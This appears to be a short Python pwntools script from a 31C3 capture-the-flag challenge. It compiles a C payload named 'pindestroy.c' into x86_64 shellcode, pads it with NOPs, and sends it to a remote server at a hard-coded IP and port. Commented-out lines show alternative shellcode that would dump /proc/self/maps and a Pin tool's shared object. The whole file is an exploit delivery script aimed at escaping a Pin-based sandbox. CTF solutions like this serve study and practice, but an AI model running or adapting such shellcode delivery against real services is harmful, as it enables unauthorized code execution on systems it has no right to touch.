#!/usr/bin/python
from pwn import *
import cshc
context("amd64", "linux")
r = remote("188.40.18.84", 1234)

print r.recvline()
#sc = flat(shellcode.cat("/proc/self/maps"))
#sc = flat(shellcode.cat("/home/user/pin/source/tools/31C3_pin_escape/obj-intel64/31C3_pin_escape.so"))
sc = cshc.arch("x86_64").compile_file("pindestroy.c")
sc += "\x90" * 8
print len(sc) ,"/", 4086
assert len(sc) <= 4086
r.send(sc)
print r.recvall()
